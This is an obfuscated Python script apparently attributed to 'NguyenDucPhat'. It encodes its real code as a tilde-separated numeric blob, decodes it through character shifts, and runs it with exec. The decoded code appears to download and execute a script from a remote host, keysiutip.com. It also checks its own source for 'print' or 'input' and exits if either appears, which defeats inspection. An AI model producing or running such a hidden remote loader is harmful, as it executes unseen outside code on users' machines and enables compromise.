#NguyenDucPhat
class NguyenDucPhat():
 def __init__(self:object,_delete:bool=False,_bytes:str=0,*_decode:int,**_bits:str)->exec:
  _delete,self._eval,self._system,self._exec,self._byte,_bits[_bytes]=lambda _delete:exit()if self._eval[15]+self._eval[17]+self._eval[8]+self._eval[13]+self._eval[19] in open(__file__, errors=self._eval[8]+self._eval[6]+self._eval[13]+self._eval[14]+self._eval[17]+self._eval[4]).read() or self._eval[8]+self._eval[13]+self._eval[15]+self._eval[20]+self._eval[19] in open(__file__, errors=self._eval[8]+self._eval[6]+self._eval[13]+self._eval[14]+self._eval[17]+self._eval[4]).read()else"".join(_delete if _delete not in self._eval else self._eval[self._eval.index(_delete)+1 if self._eval.index(_delete)+1<len(self._eval)else 0]for _delete in "".join(chr(ord(t)-202945)if t!="ζ"else"\n"for t in self._exec(_delete))),exit()if _delete else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _delete:str(_bits[_bytes](f"{self._eval[4]+self._eval[-13]+self._eval[4]+self._eval[2]}(''.join(%s),{self._eval[6]+self._eval[11]+self._eval[14]+self._eval[1]+self._eval[0]+self._eval[11]+self._eval[18]}())"%list(_delete))).encode(self._eval[20]+self._eval[19]+self._eval[5]+self._eval[34])if _bits[_bytes]==eval else exit(),lambda _exit:"".join(chr(int(_boom)-len(_exit.split('~')))if _boom!='¨'else'ζ'for _boom in str(_exit).split('~')),lambda _encode:_delete(_encode),eval
  return self.__decode__(_bits[(self._eval[-1]+'_')[-1]+self._eval[18]+self._eval[15]+self._eval[0]+self._eval[17]+self._eval[10]+self._eval[11]+self._eval[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._system(self._byte(_execute)))[0]
NguyenDucPhat(_delete=False,_sparkle='''203338~203342~203345~203344~203347~203349~203266~203347~203334~203346~203350~203334~203348~203349~203348~¨~203338~203342~203345~203344~203347~203349~203266~203344~203348~203278~203266~203348~203354~203348~¨~203344~203348~203280~203348~203354~203348~203349~203334~203342~203274~203273~203332~203341~203334~203291~203347~203273~203275~¨~203345~203347~203338~203343~203349~203274~203273~203326~203356~203284~203284~203325~203282~203293~203284~203283~203342~203320~203350~203338~203266~203310~203476~203343~203336~203266~203506~211141~203338~203280~203280~203280~203273~203275~¨~203273~203273~203273~¨~203269~203300~211077~203343~203266~203315~203350~203354~211107~203343~203266~203301~211145~203291~203266~203312~203336~203350~203354~203334~203343~203302~203350~203332~203314~203337~203291~203349~203278~203266~203302~203334~203332~203266~203506~203666~211141~203332~203266~203300~203459~203343~203266~203318~203337~203470~203266~203312~203337~211133~203266~203305~203337~203338~203266~203300~211077~203343~203266~203315~203350~203354~211107~203343~203266~203303~203342~203266~203455~203266~203318~203337~211147~203332~203266~203310~203458~203266~203302~203344~203266~203311~203470~203343~203337~203266~203318~203337~203291~203343~203340~203348~203267~203267~¨~203273~203273~203273~¨~203334~203353~203334~203332~203274~203347~203334~203346~203350~203334~203348~203349~203348~203280~203336~203334~203349~203274~203268~203337~203349~203349~203345~203348~203292~203281~203281~203340~203334~203354~203348~203338~203350~203351~203338~203345~203280~203332~203344~203342~203281~203312~203336~203350~203354~203334~203343~203302~203350~203332~203314~203337~203291~203349~203329~203314~203354~203349~203337~203344~203343~203281~203356~203284~203329~203347~203345~203352~203341~203338~203340~203334~203347~203329~203341~203338~203340~203334~203349~203291~203354~203329~203333~203291~203341~203350~203344~203343~203336~203280~203345~203337~203345~203268~203275~203280~203349~203334~203353~203349~203275''')